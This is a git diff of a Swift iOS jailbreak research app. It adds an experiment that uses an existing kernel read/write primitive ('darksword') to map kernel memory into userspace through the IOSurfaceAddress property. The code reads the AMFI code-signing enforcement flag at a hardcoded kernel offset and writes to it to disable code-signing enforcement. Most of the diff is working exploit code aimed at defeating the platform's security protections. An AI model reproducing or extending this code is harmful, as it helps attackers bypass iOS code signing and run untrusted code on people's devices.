@@ -7,6 +7,7 @@
 //
 
 import SwiftUI
+import IOSurface
 
 struct AMFIExperimentView: View {
     @ObservedObject private var root = RootExecutor.shared
@@ -466,11 +467,11 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp51)
             
             // ============================================
-            // 🔥🔥🔥🔥 Experiment 52: IOSurface with IOSurfaceAddress!
-            // Map kernel VA directly via IOSurfaceAddress property!
-            // darksword already uses this technique!
+            // 🔥🔥🔥🔥 Experiment 52: IOSurface from OUR APP (not RC!)
+            // Our app already used IOSurface during exploit!
+            // IOSurfaceAddress might work from exploit context!
             // ============================================
-            let exp52 = self.expIOSurfaceMapKernelAddr()
+            let exp52 = self.expIOSurfaceFromApp()
             experimentResults.append(exp52)
             
             DispatchQueue.main.async {
@@ -3142,6 +3143,97 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("✅ Surface memory R/W")
         return ExperimentResult(name: "🔥🔥🔥 IOSurface AMFI", success: success, detail: detail, timestamp: Date())
+    }
+    
+    /// IOSurface from OUR APP — not via RemoteCall!
+    /// Our app already has IOSurface connection from darksword exploit.
+    /// IOSurfaceAddress might work from our app's context (sandbox-escaped, has KRW)
+    private func expIOSurfaceFromApp() -> ExperimentResult {
+        let mgr = dspmgr.shared
+        var detail = "IOSurface from OUR APP (direct, not RC)\n\n"
+        
+        guard mgr.dsready else {
+            return ExperimentResult(name: "🔥🔥🔥🔥 IOSurface APP", success: false, detail: "Kernel not ready", timestamp: Date())
+        }
+        
+        // Our app already used IOSurface during exploit!
+        // Try creating IOSurface with IOSurfaceAddress from our own process
+        let targetAddr = ds_get_our_proc() // safe test first
+        let amfiAddr = UInt64(0xfffffff00a3304e8) + mgr.kernslide
+        
+        detail += "Test target (our proc): 0x\(String(format: "%llx", targetAddr))\n"
+        detail += "AMFI target: 0x\(String(format: "%llx", amfiAddr))\n\n"
+        
+        // Create IOSurface with IOSurfaceAddress directly from our app
+        // This is what darksword does in create_surface_with_address!
+        let props: [String: Any] = [
+            "IOSurfaceAddress": Int64(bitPattern: targetAddr),
+            "IOSurfaceAllocSize": 0x4000,
+        ]
+        
+        // Use IOSurface Swift framework
+        let surface = IOSurface(properties: props as [IOSurfacePropertyKey: Any])
+        
+        if let surface = surface {
+            detail += "✅ IOSurface created from app!\n"
+            detail += "Surface ID: \(IOSurfaceGetID(surface))\n"
+            
+            surface.lock(options: [], seed: nil)
+            let base = surface.baseAddress
+            detail += "Base address: \(base)\n"
+            
+            if base != UnsafeMutableRawPointer(bitPattern: 0) {
+                let val = base.load(as: UInt64.self)
+                detail += "Read value: 0x\(String(format: "%016llx", val))\n"
+                
+                let socketVal = ds_kread64(targetAddr)
+                detail += "Socket KRW same addr: 0x\(String(format: "%016llx", socketVal))\n"
+                
+                if val == socketVal && val != 0 {
+                    detail += "\n✅✅✅✅ KERNEL MEMORY MAPPED TO USERSPACE! ✅✅✅✅\n"
+                    detail += "IOSurfaceAddress WORKS from our app!\n\n"
+                    detail += "Now mapping AMFI address...\n"
+                    
+                    // Try AMFI address
+                    let amfiProps: [String: Any] = [
+                        "IOSurfaceAddress": Int64(bitPattern: amfiAddr),
+                        "IOSurfaceAllocSize": 0x4000,
+                    ]
+                    let amfiSurface = IOSurface(properties: amfiProps as [IOSurfacePropertyKey: Any])
+                    if let amfiSurf = amfiSurface {
+                        amfiSurf.lock(options: [], seed: nil)
+                        let amfiBase = amfiSurf.baseAddress
+                        if amfiBase != UnsafeMutableRawPointer(bitPattern: 0) {
+                            let csVal = amfiBase.load(as: UInt32.self)
+                            detail += "cs_enforcement value: 0x\(String(format: "%x", csVal))\n"
+                            detail += "\n🎉🎉🎉🎉🎉 CAN READ+WRITE AMFI! 🎉🎉🎉🎉🎉\n"
+                            
+                            // WRITE 1 TO DISABLE!
+                            amfiBase.storeBytes(of: UInt32(1), as: UInt32.self)
+                            let verify = amfiBase.load(as: UInt32.self)
+                            detail += "After write 1: 0x\(String(format: "%x", verify))\n"
+                            detail += "CS ENFORCEMENT DISABLED!!!\n"
+                        }
+                        amfiSurf.unlock(options: [], seed: nil)
+                    } else {
+                        detail += "AMFI surface create failed\n"
+                    }
+                } else {
+                    detail += "Values don't match (val=0x\(String(format: "%llx", val)))\n"
+                    detail += "IOSurfaceAddress might map physical, not virtual\n"
+                }
+            } else {
+                detail += "Base address is NULL\n"
+            }
+            surface.unlock(options: [], seed: nil)
+        } else {
+            detail += "❌ IOSurface creation failed from app\n"
+            detail += "IOSurfaceAddress might be rejected (sandbox?)\n"
+            detail += "Or: need IOSurfaceRoot user client connection first\n"
+        }
+        
+        let success = detail.contains("🎉🎉🎉")
+        return ExperimentResult(name: "🔥🔥🔥🔥 IOSurface APP", success: success, detail: detail, timestamp: Date())
     }
     
     /// 🔥🔥🔥🔥 THE KEY: Create IOSurface with IOSurfaceAddress = kernel VA!
